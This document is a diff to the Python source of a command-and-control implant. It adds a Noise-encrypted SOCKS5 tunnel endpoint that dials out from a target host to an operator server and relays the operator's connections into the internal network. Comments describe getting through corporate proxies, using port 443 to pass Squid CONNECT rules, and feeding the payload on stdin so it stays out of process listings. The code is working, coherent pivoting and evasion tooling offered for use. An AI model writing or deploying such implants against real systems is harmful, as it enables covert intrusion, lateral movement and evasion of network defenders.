+# The SOCKS greeting and the RFC 1929 username/password sub-negotiation
+# are deliberately absent. Only the operator-facing side performs those,
+# and that side is never delivered to a target, so neither belongs in this
+# file.
+
+# The frame length prefix and the SOCKS port, which are the two numbers a
+# reader will check the byte order of. One struct for both, because they
+# are one decision.
+_BE_UINT16 = struct.Struct(">H")
+
+FRAME_PREFIX_LEN = _BE_UINT16.size
+
+# A frame carries one Noise message, so its ceiling is Noise's own -- and
+# that is exactly what a `>H` prefix can express, so a frame that fits the
+# prefix always fits the cipher and there is no third limit to keep in step.
+MAX_FRAME_LEN = NoiseSession.MAX_MESSAGE_LEN
+
+# The plaintext ceiling, a frame's worth less the GCM tag. Aliased from the
+# session rather than written as a number again: two names for 65519 is one
+# too many, and the second would be the one that goes stale.
+MAX_PAYLOAD_LEN = NoiseSession.MAX_PAYLOAD_LEN
+
+
+def write_frame(sock: socket.socket, payload: bytes) -> None:
+    """Write one length-prefixed frame, or refuse before touching `sock`.
+
+    Both refusals happen before any byte goes out, because a prefix on the
+    wire with nothing behind it leaves the peer unable to read the stream
+    ever again and there is no way to take it back. That is also why the
+    prefix and the body go in one `sendall` rather than two: one call
+    cannot leave a prefix written and a body unwritten by returning
+    between them.
+
+    It is **not** a claim that a frame is atomic against another thread.
+    `sendall` loops over partial sends and releases the GIL in each of
+    them, so two threads writing one socket could still interleave. That
+    is sound here because every socket in this protocol has exactly one
+    writer -- the command channel's `send` holds a lock, and a relay
+    stream holds one that also orders the nonce -- and a future caller
+    that wants a second writer has to bring its own lock rather than read
+    one into this function.
+    """
+    if not payload:
+        raise ValueError(
+            "an empty frame is the two bytes 00 00 on the wire; this "
+            "protocol never sends one")
+    if len(payload) > MAX_FRAME_LEN:
+        raise ValueError(
+            "frame payload is %d bytes; a `>H` prefix tops out at %d"
+            % (len(payload), MAX_FRAME_LEN))
+    sock.sendall(_BE_UINT16.pack(len(payload)) + payload)
+
+
+def read_frame(sock: socket.socket) -> bytes:
+    """One whole frame's payload, or a ValueError.
+
+    A peer that closes mid-frame raises, and so does one that stalls past
+    the socket's own timeout -- the caller sets that, because how long to
+    wait is the caller's policy and not this function's. What never
+    happens is a short read returned as though it were a whole frame.
+    """
+    prefix = _read_exactly(sock, FRAME_PREFIX_LEN, "frame length prefix")
+    (length,) = _BE_UINT16.unpack(prefix)
+    if length == 0:
+        raise ValueError(
+            "a frame of length 0 is the two bytes 00 00; this protocol "
+            "neither sends nor accepts one")
+    return _read_exactly(sock, length, "frame body")
+
+
+def _read_exactly(sock: socket.socket, count: int, what: str) -> bytes:
+    """Exactly `count` bytes, or a ValueError naming how far it got."""
+    chunks = []
+    have = 0
+    while have < count:
+        chunk = sock.recv(count - have)
+        if not chunk:
+            raise ValueError(
+                "the peer closed after %d of %d bytes of the %s"
+                % (have, count, what))
+        chunks.append(chunk)
+        have += len(chunk)
+    return b"".join(chunks)
+
+
+# ── Command messages ──
+
+MSG_HELLO = 1
+MSG_RELAY = 2
+MSG_OPEN_RELAY = 3
+MSG_PING = 4
+MSG_PONG = 5
+MSG_CLOSE = 6
+
+MESSAGE_KIND_NAMES = {
+    MSG_HELLO: "HELLO",
+    MSG_RELAY: "RELAY",
+    MSG_OPEN_RELAY: "OPEN_RELAY",
+    MSG_PING: "PING",
+    MSG_PONG: "PONG",
+    MSG_CLOSE: "CLOSE",
+}
+
+MESSAGE_KINDS = tuple(sorted(MESSAGE_KIND_NAMES))
+
+
+def _code_list(table: dict) -> str:
+    """`1 (HELLO), 2 (RELAY)` -- what an error says it expected instead.
+
+    Built from the table rather than written out, so a renumbering cannot
+    leave an error message describing the protocol as it used to be.
+    """
+    return ", ".join("%d (%s)" % (code, table[code])
+                     for code in sorted(table))
+
+
+def encode_message(kind: int, body: dict) -> bytes:
+    """One command message: a kind byte and a compact JSON object.
+
+    JSON rather than a packed struct because this channel carries a handful
+    of messages an hour, so being able to read a capture of our own test
+    rig is worth more than the bytes. Keys are sorted, so the same body
+    always encodes to the same bytes and two captures diff cleanly.
+    """
+    if kind not in MESSAGE_KIND_NAMES:
+        raise ValueError("message kind %r is not one of %s"
+                         % (kind, _code_list(MESSAGE_KIND_NAMES)))
+    if not isinstance(body, dict):
+        raise ValueError("a message body is a JSON object, not %s"
+                         % type(body).__name__)
+    try:
+        text = json.dumps(body, separators=(",", ":"), sort_keys=True)
+    except (TypeError, ValueError):
+        text = None
+    # Raised outside the except block, and without the body in it: a body
+    # holds a session token and a hostname, and neither belongs in a log.
+    if text is None:
+        raise ValueError("a %s body must be JSON-serialisable with string "
+                         "keys" % MESSAGE_KIND_NAMES[kind])
+    raw = bytes([kind]) + text.encode("utf-8")
+    if len(raw) > MAX_PAYLOAD_LEN:
+        raise ValueError(
+            "a %s message encodes to %d bytes; at most %d fits in one "
+            "Noise message" % (MESSAGE_KIND_NAMES[kind], len(raw),
+                               MAX_PAYLOAD_LEN))
+    return raw
+
+
+def decode_message(raw: bytes) -> Tuple[int, dict]:
+    """The kind and body of one command message, or a ValueError."""
+    data = bytes(raw)
+    if not data:
+        raise ValueError("a command message is at least a kind byte")
+    kind = data[0]
+    if kind not in MESSAGE_KIND_NAMES:
+        raise ValueError("message kind %d is not one of %s"
+                         % (kind, _code_list(MESSAGE_KIND_NAMES)))
+    try:
+        # json.JSONDecodeError and UnicodeDecodeError are both ValueErrors.
+        body = json.loads(data[1:].decode("utf-8"))
+    except ValueError:
+        body = None
+    if not isinstance(body, dict):
+        raise ValueError("the body of a %s message is not a JSON object"
+                         % MESSAGE_KIND_NAMES[kind])
+    return kind, body
+
+
+# ── SOCKS5 requests and replies, RFC 1928 §4 and §6 ──
+
+SOCKS_VERSION = 5
+
+# RFC 1928 reserves byte 3 of both messages and fixes it at zero, so a
+# non-zero one here is a malformed message.
+_SOCKS_RESERVED = 0
+
+# ver | cmd-or-rep | rsv | atyp, before the address.
+_SOCKS_HEADER_LEN = 4
+
+CMD_CONNECT = 1
+CMD_BIND = 2
+CMD_UDP_ASSOCIATE = 3
+
+SOCKS_COMMAND_NAMES = {
+    CMD_CONNECT: "CONNECT",
+    CMD_BIND: "BIND",
+    CMD_UDP_ASSOCIATE: "UDP ASSOCIATE",
+}
+
+# Only CONNECT is answered. The other two still decode, because a peer that
+# asks for one has to be refused with REPLY_COMMAND_NOT_SUPPORTED, and a
+# refusal cannot be sent for a request that never parsed -- a parse error
+# is indistinguishable, from the far end, from a tunnel that has died.
+SUPPORTED_COMMANDS = (CMD_CONNECT,)
+
+ATYP_IPV4 = 1
+ATYP_DOMAIN = 3
+ATYP_IPV6 = 4
+
+SOCKS_ADDRESS_TYPE_NAMES = {
+    ATYP_IPV4: "IPv4",
+    ATYP_DOMAIN: "domain name",
+    ATYP_IPV6: "IPv6",
+}
+
+REPLY_SUCCEEDED = 0
+REPLY_GENERAL_FAILURE = 1
+REPLY_NOT_ALLOWED = 2
+REPLY_NETWORK_UNREACHABLE = 3
+REPLY_HOST_UNREACHABLE = 4
+REPLY_CONNECTION_REFUSED = 5
+REPLY_TTL_EXPIRED = 6
+REPLY_COMMAND_NOT_SUPPORTED = 7
+REPLY_ADDRESS_TYPE_NOT_SUPPORTED = 8
+
+SOCKS_REPLY_NAMES = {
+    REPLY_SUCCEEDED: "succeeded",
+    REPLY_GENERAL_FAILURE: "general SOCKS server failure",
+    REPLY_NOT_ALLOWED: "connection not allowed by ruleset",
+    REPLY_NETWORK_UNREACHABLE: "network unreachable",
+    REPLY_HOST_UNREACHABLE: "host unreachable",
+    REPLY_CONNECTION_REFUSED: "connection refused",
+    REPLY_TTL_EXPIRED: "TTL expired",
+    REPLY_COMMAND_NOT_SUPPORTED: "command not supported",
+    REPLY_ADDRESS_TYPE_NOT_SUPPORTED: "address type not supported",
+}
+
+
+def socks_command_supported(cmd: int) -> bool:
+    """Whether this end answers `cmd` rather than refusing it.
+
+    Separate from `decode_socks_request` on purpose, so that a BIND or UDP
+    ASSOCIATE request decodes and the caller can answer it with
+    REPLY_COMMAND_NOT_SUPPORTED.
+    """
+    return cmd in SUPPORTED_COMMANDS
+
+
+def encode_socks_request(cmd: int, atyp: int, address: str,
+                         port: int) -> bytes:
+    """One SOCKS5 request, RFC 1928 §4.
+
+    `atyp` is passed rather than inferred from `address`: the operator-side
+    proxy relays what its client asked for, and a client that sends ATYP=3
+    with something that happens to look like an IP literal must still be
+    relayed as a name.
+    """
+    if cmd not in SOCKS_COMMAND_NAMES:
+        raise ValueError("SOCKS command %r is not one of %s"
+                         % (cmd, _code_list(SOCKS_COMMAND_NAMES)))
+    return _encode_socks_envelope(cmd, atyp, address, port)
+
+
+def decode_socks_request(raw: bytes) -> Tuple[int, int, str, int]:
+    """`(cmd, atyp, address, port)` from one whole SOCKS5 request.
+
+    `raw` must be exactly one request and nothing else: on this protocol a
+    request arrives as its own frame, so trailing bytes are a malformed
+    message rather than the beginning of the relayed stream. A reader
+    pulling requests out of a raw TCP stream has to delimit them itself.
+    """
+    cmd, atyp, address, port = _decode_socks_envelope(raw, "request")
+    if cmd not in SOCKS_COMMAND_NAMES:
+        raise ValueError("SOCKS command %d is not one of %s"
+                         % (cmd, _code_list(SOCKS_COMMAND_NAMES)))
+    return cmd, atyp, address, port
+
+
+def encode_socks_reply(reply: int, atyp: int = ATYP_IPV4,
+                       address: str = "0.0.0.0", port: int = 0) -> bytes:
+    """One SOCKS5 reply, RFC 1928 §6, where `REPLY_SUCCEEDED` is 0.
+
+    The bound address defaults to `0.0.0.0:0` because RFC 1928 leaves
+    BND.ADDR and BND.PORT meaningless when the reply is not a success, and
+    every refusal path would otherwise have to invent one.
+    """
+    if reply not in SOCKS_REPLY_NAMES:
+        raise ValueError("SOCKS reply code %r is not one of %s"
+                         % (reply, _code_list(SOCKS_REPLY_NAMES)))
+    return _encode_socks_envelope(reply, atyp, address, port)
+
+
+def decode_socks_reply(raw: bytes) -> Tuple[int, int, str, int]:
+    """`(reply, atyp, address, port)` from one whole SOCKS5 reply."""
+    reply, atyp, address, port = _decode_socks_envelope(raw, "reply")
+    if reply not in SOCKS_REPLY_NAMES:
+        raise ValueError("SOCKS reply code %d is not one of %s"
+                         % (reply, _code_list(SOCKS_REPLY_NAMES)))
+    return reply, atyp, address, port
+
+
+def _encode_socks_envelope(code: int, atyp: int, address: str,
+                           port: int) -> bytes:
+    """`ver | code | rsv | atyp | addr | port`, where `code` is the CMD of
+    a request or the REP of a reply.
+
+    Shared because those two messages differ in nothing else, and a layout
+    written down twice is a layout that gets corrected once.
+    """
+    if not isinstance(address, str):
+        raise ValueError("a SOCKS address is text, not %s"
+                         % type(address).__name__)
+    if not isinstance(port, int) or not 0 <= port <= 0xFFFF:
+        raise ValueError("port %r is not a uint16" % (port,))
+    return (bytes([SOCKS_VERSION, code, _SOCKS_RESERVED, atyp])
+            + _encode_socks_address(atyp, address)
+            + _BE_UINT16.pack(port))
+
+
+def _decode_socks_envelope(raw: bytes,
+                           what: str) -> Tuple[int, int, str, int]:
+    data = bytes(raw)
+    if len(data) < _SOCKS_HEADER_LEN:
+        raise ValueError(
+            "a SOCKS %s opens with %d bytes of header; this one is %d "
+            "bytes long in total" % (what, _SOCKS_HEADER_LEN, len(data)))
+    if data[0] != SOCKS_VERSION:
+        raise ValueError(
+            "a SOCKS %s opens with version %d; this one says %d"
+            % (what, SOCKS_VERSION, data[0]))
+    if data[2] != _SOCKS_RESERVED:
+        raise ValueError(
+            "RFC 1928 reserves byte 3 of a %s and fixes it at 0x%02x; this "
+            "one is 0x%02x" % (what, _SOCKS_RESERVED, data[2]))
+    atyp = data[3]
+    address, used = _decode_socks_address(data[_SOCKS_HEADER_LEN:], atyp,
+                                          what)
+    expected = _SOCKS_HEADER_LEN + used + _BE_UINT16.size
+    if len(data) != expected:
+        raise ValueError(
+            "a SOCKS %s with this address is %d bytes; this one is %d"
+            % (what, expected, len(data)))
+    (port,) = _BE_UINT16.unpack(data[expected - _BE_UINT16.size:])
+    # Byte 1 is the CMD of a request and the REP of a reply; which one it
+    # is, and whether this end knows that value, is the caller's to say.
+    return data[1], atyp, address, port
+
+
+def _encode_socks_address(atyp: int, address: str) -> bytes:
+    if atyp == ATYP_IPV4:
+        return _pack_socks_ip(socket.AF_INET, address, "an IPv4 address")
+    if atyp == ATYP_IPV6:
+        return _pack_socks_ip(socket.AF_INET6, address, "an IPv6 address")
+    if atyp == ATYP_DOMAIN:
+        name = address.encode("utf-8")
+        if not name:
+            raise ValueError("a SOCKS domain name cannot be empty")
+        if len(name) > 0xFF:
+            raise ValueError(
+                "a SOCKS domain name is %d bytes and its length byte tops "
+                "out at %d" % (len(name), 0xFF))
+        return bytes([len(name)]) + name
+    raise ValueError("SOCKS address type %r is not one of %s"
+                     % (atyp, _code_list(SOCKS_ADDRESS_TYPE_NAMES)))
+
+
+def _pack_socks_ip(family: int, address: str, what: str) -> bytes:
+    try:
+        packed = socket.inet_pton(family, address)
+    except (OSError, ValueError):
+        packed = None
+    if packed is None:
+        raise ValueError("%r is not %s" % (address, what))
+    return packed
+
+
+def _decode_socks_address(tail: bytes, atyp: int,
+                          what: str) -> Tuple[str, int]:
+    """The address in `tail`, and how many of its bytes it took."""
+    if atyp == ATYP_IPV4:
+        return _unpack_socks_ip(socket.AF_INET, tail, 4, what), 4
+    if atyp == ATYP_IPV6:
+        return _unpack_socks_ip(socket.AF_INET6, tail, 16, what), 16
+    if atyp == ATYP_DOMAIN:
+        if not tail:
+            raise ValueError("a SOCKS %s with ATYP=3 carries no length byte"
+                             % what)
+        length = tail[0]
+        if length == 0:
+            raise ValueError("a SOCKS %s carries an empty domain name"
+                             % what)
+        if len(tail) < 1 + length:
+            raise ValueError(
+                "a SOCKS %s promises a %d-byte domain name and carries %d "
+                "bytes of it" % (what, length, len(tail) - 1))
+        try:
+            name = tail[1:1 + length].decode("utf-8")
+        except ValueError:
+            name = None
+        # Refused rather than mangled with a replacement character: a name
+        # we cannot read is a name we must not silently resolve.
+        if name is None:
+            raise ValueError("the domain name in a SOCKS %s is not UTF-8"
+                             % what)
+        return name, 1 + length
+    raise ValueError("SOCKS address type %d is not one of %s"
+                     % (atyp, _code_list(SOCKS_ADDRESS_TYPE_NAMES)))
+
+
+def _unpack_socks_ip(family: int, tail: bytes, size: int,
+                     what: str) -> str:
+    if len(tail) < size:
+        raise ValueError(
+            "a SOCKS %s needs %d address bytes and carries %d"
+            % (what, size, len(tail)))
+    return socket.inet_ntop(family, tail[:size])
 
 
 # ── Stdlib DNS resolver (TXT + A records) ──
@@ -548,7 +1645,108 @@ def _dns_query(name: str, qtype: str, server: str, timeout: float = 10) -> list:
 _FALLBACK_TRANSPORTS = ("https", "dns", "smb", "quic")
 
 
-def beacon_config_from_fallback(c2_cfg: dict, dropbox: bool = True) -> dict:
+def tunnel_config_from_yaml(c2_cfg: dict, env=None) -> Optional[dict]:
+    """Build the endpoint's `tunnel` block from `c2.tunnel`, or None.
+
+    The sibling of `beacon_config_from_fallback` for the other thing a
+    drop-box can run, and the reason goal 3 of this work is reachable: on
+    a host where systemd starts the endpoint there is no beacon above it
+    and no generated config block, so the file has to be able to say the
+    same eight things the generator bakes in.
+
+    `c2.tunnel` is **this host as a tunnel client** -- the endpoint dials
+    out. `c2.tunnel_server` is the other side, the socket endpoints dial
+    in to, and nothing here reads it. The two look alike and mean opposite
+    things, exactly as `c2.fallback` and `c2.listeners` do; see
+    `listeners/registry.py`.
+
+    No `c2.tunnel` block at all yields None and is not an error: every
+    deployment that predates this feature has none, and all of them have
+    to keep starting.
+
+    **The PSK is not read from the file.** Under `Noise_NKpsk0` the
+    endpoint presents no static key of its own, so the PSK plus the
+    server's public key is the entire credential, and this repository
+    already settled where such a thing lives when it kept
+    `RACCOON_LISTENER_TOKEN` out of the same file: a shared secret does
+    not belong in something somebody will paste into a ticket. It comes
+    from `RACCOON_TUNNEL_PSK`, which
+    `services/raccoon-tunnel.service` supplies through an
+    `EnvironmentFile`. A `psk` key found in the file is **refused by
+    name**, whether the tunnel is enabled or not: ignoring it silently
+    would leave the secret sitting in git with nobody told, and a
+    refusal that waited for somebody to switch the tunnel on would have
+    chosen the worst possible moment to appear.
+
+    `env` is a seam for the tests. The deployed path is `os.environ`.
+
+    Every problem is a `ValueError` naming the field, including the ones
+    `tunnel_config_problem` finds: this is where the config is loaded, so
+    this is where that predicate is asked. The caller decides what a
+    refusal costs -- `tunnel_standalone` exits, and
+    `beacon_config_from_fallback` leaves the block out and logs, because
+    the beacon is the access and the tunnel is the convenience.
+    """
+    tunnel = c2_cfg.get("tunnel") if isinstance(c2_cfg, dict) else None
+    if tunnel is None:
+        return None
+    if not isinstance(tunnel, dict):
+        raise ValueError("c2.tunnel is %s, not a mapping"
+                         % type(tunnel).__name__)
+    if "psk" in tunnel:
+        raise ValueError(
+            "c2.tunnel.psk is not read from this file: it is the whole "
+            "credential, and a shared secret does not belong in something "
+            "somebody will paste into a ticket. Delete the key and put the "
+            "value in %s instead, the way "
+            "services/raccoon-tunnel.service does with an EnvironmentFile."
+            % _TUNNEL_PSK_ENV)
+
+    enabled = bool(tunnel.get("enabled"))
+    psk = ""
+    if enabled:
+        source = os.environ if env is None else env
+        supplied = source.get(_TUNNEL_PSK_ENV, "")
+        problem = None
+        try:
+            _tunnel_key(supplied, _TUNNEL_PSK_ENV,
+                        "this host's pre-shared key")
+        except ValueError as exc:
+            problem = str(exc)
+        if problem:
+            # Raised outside the except block, as `_tunnel_key` raises its
+            # own: nothing that touched the value may ride along in the
+            # exception chain.
+            raise ValueError(
+                "%s, and c2.tunnel is enabled. It is deliberately not in "
+                "the config file; see services/raccoon-tunnel.service"
+                % problem)
+        psk = supplied.strip()
+
+    # Every field, always, so this and the generator produce one shape.
+    # `server`, `port`, `public_key` and `identity` are passed through
+    # untouched rather than defaulted, so that a block which cannot work
+    # is named by `tunnel_config_problem` below and not quietly completed
+    # here into something that dials the wrong place.
+    block = {
+        "enabled": enabled,
+        "server": tunnel.get("server", ""),
+        "port": tunnel.get("port"),
+        "public_key": tunnel.get("public_key", ""),
+        "psk": psk,
+        "identity": tunnel.get("identity", ""),
+        "keepalive_seconds": tunnel.get("keepalive_seconds",
+                                        _DEFAULT_KEEPALIVE),
+        "allow_slow_crypto": bool(tunnel.get("allow_slow_crypto")),
+    }
+    problem = tunnel_config_problem({"c2": {"tunnel": block}})
+    if problem:
+        raise ValueError(problem)
+    return block
+
+
+def beacon_config_from_fallback(c2_cfg: dict, dropbox: bool = True,
+                                env=None) -> dict:
     """Build a Beacon config from a `c2` block of `configs/raccoon.yaml`.
 
     Reads `c2.fallback.*`, which is the **beacon** side of the file: the
@@ -559,6 +1757,28 @@ def beacon_config_from_fallback(c2_cfg: dict, dropbox: bool = True) -> dict:
     beacon reads as disabled. That is why this cannot simply pass the
     fallback block through: the beacon expects its transports at the top
     of its own `c2` block, not nested under `fallback`.
+
+    `c2.tunnel` comes through `tunnel_config_from_yaml` and lands at
+    `c2.tunnel` of the config this returns, which is where both `Beacon`
+    and `TunnelEndpoint` look for it.
+
+    **A tunnel this host cannot run does not cost it its beacon, and does
+    not lose its reason either.** That loader refuses a block it cannot
+    make, naming the field. Here the block is left out -- it is the only
+    one there is, and in the `psk`-in-the-file case it is the one holding
+    the file's secret, so handing it on would let `tunnel start` dial
+    with the value this rule exists to refuse. What is kept is the
+    reason, at `c2.tunnel_problem`, which `Beacon._tunnel_start` answers
+    the operator with. Without it `tunnel_mode_problem` would take its
+    no-block arm and say "generate the build with the tunnel enabled",
+    which is false and unactionable advice for a host whose tunnel came
+    from a file.
+
+    The beacon starts either way, because it is the access and the tunnel
+    is the convenience. The log line is a second channel and not the only
+    one: this function is reached only when Sliver is unavailable and
+    `c2.fallback.enabled` is true, and it writes to a rotating file, so a
+    refusal that lived only there would be a refusal nobody saw.
     """
     fallback = c2_cfg.get("fallback") or {}
     block = {
@@ -570,6 +1790,15 @@ def beacon_config_from_fallback(c2_cfg: dict, dropbox: bool = True) -> dict:
     }
     for transport in _FALLBACK_TRANSPORTS:
         block[transport] = fallback.get(transport, {})
+    try:
+        tunnel = tunnel_config_from_yaml(c2_cfg, env=env)
+    except ValueError as exc:
+        logger.error("c2.tunnel cannot be used and has been left out of "
+                     "this config: %s", exc)
+        block["tunnel_problem"] = str(exc)
+        tunnel = None
+    if tunnel is not None:
+        block["tunnel"] = tunnel
     return {"c2": block}
 
 
@@ -1307,6 +2536,1360 @@ class ProxyDiscovery:
         return "\n".join(lines)
 
 
+# ── The tunnel endpoint ──
+#
+# The far end of the tunnel: it connects out, holds one command channel
+# open, and on request opens further connections that each proxy one TCP
+# stream into its own network. `software/c2/tunnel/server.py` is the other
+# half and the authority on the protocol; the shape, briefly:
+#
+#   * one connection to one port, carrying a Noise `NKpsk0` handshake
+#     whose first payload is a `HELLO` -- that connection is the command
+#     channel the server holds;
+#   * an `OPEN_RELAY(port, token)` down it per session the operator opens;
+#   * a **second connection to the same port** whose first payload is a
+#     `RELAY(token)`, which the server splices to the operator's SOCKS
+#     client.
+#
+# One port for both, because the usual way out of a target network is an
+# HTTP `CONNECT` proxy that permits 443 and nothing else: Squid ships
+# `acl SSL_ports port 443` with `http_access deny CONNECT !SSL_ports`, so
+# a design that dialled back to a fresh high port per session could not
+# form a tunnel at all from most hosts. The 32-byte token does that job
+# cryptographically rather than by arrival order, and needs no second
+# destination port.
+#
+# **Getting out is tried in order: a configured proxy, then
+# `ProxyDiscovery`, then direct.** Most hosts this runs on have no other
+# way out, so a bare `socket.connect((ip, 443))` would reach nothing at
+# all from them -- which is why the proxy path is the first one tried and
+# not a fallback. When a proxy is used this writes its own
+# `CONNECT <server>:<port>` and then speaks Noise over the tunnelled
+# stream, because what follows is not HTTP and urllib would own the
+# socket. `_NtlmProxyRelay` is a *local* CONNECT proxy that handles NTLM
+# against an upstream, so a build configured for NTLM dials
+# `127.0.0.1:<its port>` and writes an ordinary CONNECT to it.
+#
+# Three sharp edges in the layers below, handled here because this is the
+# caller they defer to:
+#
+#   * **`NoiseSession.decrypt` does not retire the session on an
+#     authentication failure.** Noise §5.1 says a session must be
+#     abandoned after a DECRYPT failure; that class leaves the policy to
+#     its caller, so a `ValueError` out of `decrypt` closes the
+#     connection here.
+#   * **`read_frame` cannot tell an orderly teardown from a malformed
+#     peer.** A clean EOF between frames raises `ValueError` just as a
+#     truncated frame does, and a stall past the socket timeout raises
+#     `socket.timeout`, which is an `OSError`. `_bytes_waiting` moves the
+#     distinction into the socket API -- one `MSG_PEEK`, where `b""` is a
+#     FIN with nothing behind it -- and it is used in the two places the
+#     difference changes what is done: the command loop, where a FIN is an
+#     ordinary reconnect and a bad frame is worth a warning, and the
+#     relay's return direction, for the same reason. Where it changes
+#     nothing -- reading the one SOCKS request a relay is owed -- it is not
+#     used, and the comment there says so.
+#   * **`write_frame`'s single `sendall` does not make concurrent writes
+#     safe**; it loops over partial sends and releases the GIL. The
+#     command channel has two writers, the command loop's PONG and the
+#     keep-alive thread's PING, so every write to it goes through
+#     `_TunnelChannel.send` and its lock -- and the lock covers `encrypt`
+#     too, because the nonce it advances has to be ordered with the frame
+#     it belongs to. A relay needs no lock and has an invariant instead:
+#     exactly one thread writes each of its two sockets, which the bridge
+#     documents.
+#
+# Keep-alive is `MSG_PING` / `MSG_PONG` and not a zero-valued port: the
+# frame layer refuses an empty frame, which is the bytes `00 00`, at both
+# ends, so a keep-alive encoded that way could not be sent or read here.
+
+# How long the command loop blocks in a read before it looks at the stop
+# flag again. Bounded so that `stop` does not wait out an idle timeout,
+# and so the loop does not depend on a closed socket waking a blocked
+# `recv`, which is not reliable on every platform.
+_CONTROL_POLL = 1.0
+
+# Bounds on the keep-alive tick, as on the server: the floor keeps a test
+# with a 100 ms interval honest, and the ceiling bounds how late a PING
+# can be whatever the configured interval is.
+_KEEPALIVE_TICK_FLOOR = 0.02
+_KEEPALIVE_TICK_CEILING = 1.0
+
+_DEFAULT_KEEPALIVE = 30.0
+_DEFAULT_CONNECT_TIMEOUT = 30.0
+
+# The reconnect backoff, the shape `Beacon._backoff_sleep` already uses:
+# a base delay, 1.5 per consecutive failure, a ceiling, and up to 20%
+# jitter on top. A dropped command channel is an ordinary event -- a
+# server restart, a proxy recycling an idle tunnel -- so the endpoint
+# reconnects rather than exiting, and the module constants are what a test
+# moves to avoid waiting out a real delay.
+_TUNNEL_RETRY_BASE = 5.0
+_TUNNEL_RETRY_CEILING = 300.0
+
+# One read fills at most one frame: the plaintext ceiling of a Noise
+# message, so nothing has to be split twice.
+_TUNNEL_CHUNK = MAX_PAYLOAD_LEN
+
+# How long a thread is waited for at teardown. Both directions of a bridge
+# are unparked by a shutdown rather than left to notice on their own, so
+# this bounds a pathology and not the normal path.
+_TUNNEL_JOIN_TIMEOUT = 5.0
+
+# Guards on a proxy's CONNECT response, the same two `_NtlmProxyRelay`
+# has: a broken or hostile proxy must not be able to make this allocate
+# without bound while parsing a reply.
+_PROXY_MAX_LINE = 8192
+_PROXY_MAX_HEADERS = 100
+
+# How the beacon tells a child it is the tunnel and not another beacon.
+#
+# An environment variable and not an argument, for two reasons. The child
+# is started as `python3 -` with its source on stdin, so there is no
+# command line left to carry a flag -- which is the whole point of that
+# form, since a quarter of a megabyte of payload in `ps` and
+# `/proc/<pid>/cmdline` is readable by every user on the host and is
+# exactly the kind of thing a fleet gets enumerated by.
+# And a variable is not in `ps` output at all, where an argument would be.
+#
+# The generated config block reads this name rather than repeating the
+# string: the parent and the child are the same file, and the two ends of
+# an agreement written twice are the two ends that drift.
+_TUNNEL_MODE_ENV = "RACCOON_TUNNEL_MODE"
+
+# Where the endpoint's PSK comes from on a host configured by file rather
+# than by a generated config block.
+#
+# Not from `configs/raccoon.yaml`, following `RACCOON_LISTENER_TOKEN`: that
+# file is in git, and under `NKpsk0` this value plus the server's public
+# key is the whole credential. `tunnel_config_from_yaml` refuses a `psk`
+# key in the file and names this variable instead;
+# `services/raccoon-tunnel.service` supplies it through an
+# `EnvironmentFile`, which unlike a unit file is not world-readable.
+_TUNNEL_PSK_ENV = "RACCOON_TUNNEL_PSK"
+
+# How long a terminated tunnel child is given to go before it is killed.
+# A child blocked in an uninterruptible syscall is exactly the pathology
+# running the endpoint in its own process exists to contain, so the wait
+# is bounded and the second signal is not negotiable.
+_TUNNEL_CHILD_STOP_TIMEOUT = 5.0
+
+# How long the child is given to read the source off its stdin. The
+# interpreter drains stdin to EOF before it compiles a line, so a few
+# hundred kilobytes is milliseconds and this bound is never reached on
+# the real path. It exists because the pipe buffer is around 64 KB and a
+# child that reads nothing -- `sys.executable` pointing at an embedded
+# interpreter or a frozen host application rather than at python -- would
+# otherwise block the beacon's own thread for ever in the write. The
+# beacon is the access and the tunnel is the convenience; the convenience
+# does not get to hang the access.
+_TUNNEL_SOURCE_TIMEOUT = 30.0
+
+# Which RFC 1928 reply code each failure to reach a target becomes.
+# Explicit, because an operator's tool prints this code directly and a
+# wrong one sends somebody debugging the wrong layer: `0x05` has them
+# looking at the service, `0x03` at the route. Anything unmapped is
+# `REPLY_GENERAL_FAILURE`, which says only that it did not work.
+_SOCKS_REPLY_FOR_ERRNO = {
+    errno.ECONNREFUSED: REPLY_CONNECTION_REFUSED,
+    # An RST in answer to a SYN is what a refusal is.
+    errno.ECONNRESET: REPLY_CONNECTION_REFUSED,
+    errno.ENETUNREACH: REPLY_NETWORK_UNREACHABLE,
+    errno.ENETDOWN: REPLY_NETWORK_UNREACHABLE,
+    errno.ENETRESET: REPLY_NETWORK_UNREACHABLE,
+    errno.EHOSTUNREACH: REPLY_HOST_UNREACHABLE,
+    errno.EHOSTDOWN: REPLY_HOST_UNREACHABLE,
+    errno.ETIMEDOUT: REPLY_TTL_EXPIRED,
+    # A local policy refusal -- a sandbox, an SELinux rule -- rather than
+    # anything the target did.
+    errno.EACCES: REPLY_NOT_ALLOWED,
+    errno.EPERM: REPLY_NOT_ALLOWED,
+    # No stack for the family the operator asked for, which is the one
+    # failure that is about the address type and not the address.
+    errno.EAFNOSUPPORT: REPLY_ADDRESS_TYPE_NOT_SUPPORTED,
+}
+
+
+def _socks_reply_for_error(exc: BaseException) -> int:
+    """The RFC 1928 reply code for one failure to reach a target.
+
+    `socket.timeout` is checked first because it is an `OSError` whose
+    `errno` is `None`, and `socket.gaierror` before the table because its
+    `errno` is an `EAI_*` code that collides numerically with the `errno`
+    values -- `EAI_NONAME` is 8 on this platform, which the table would
+    otherwise read as `ENOEXEC`. A name that does not resolve has no code
+    of its own in RFC 1928; host unreachable is the closest, and it is
+    what stops an operator blaming the tunnel for a typo.
+    """
+    if isinstance(exc, socket.timeout):
+        return REPLY_TTL_EXPIRED
+    if isinstance(exc, socket.gaierror):
+        return REPLY_HOST_UNREACHABLE
+    return _SOCKS_REPLY_FOR_ERRNO.get(getattr(exc, "errno", None),
+                                      REPLY_GENERAL_FAILURE)
+
+
+def _bound_socks_address(sock: socket.socket) -> Tuple[int, str, int]:
+    """`(atyp, address, port)` for RFC 1928 §6's BND.ADDR and BND.PORT.
+
+    The endpoint's own outgoing socket, because that is what the field
+    means and because an operator diagnosing a route wants to see which
+    interface the connection actually left by, not a canned zero. A
+    scoped IPv6 address -- `fe80::1%en0`, which `inet_pton` will not
+    take -- falls back to the unspecified address: the bound address is
+    informational and a reply that cannot be encoded would cost the
+    session.
+    """
+    try:
+        local = sock.getsockname()
+        atyp = (ATYP_IPV6 if sock.family == socket.AF_INET6 else ATYP_IPV4)
+        address, port = str(local[0]), int(local[1])
+        # Encoded and discarded, purely to find out whether it can be.
+        _encode_socks_address(atyp, address)
+        return atyp, address, port
+    except (OSError, ValueError, IndexError, TypeError):
+        return ATYP_IPV4, "0.0.0.0", 0
+
+
+def _bytes_waiting(sock: socket.socket) -> bool:
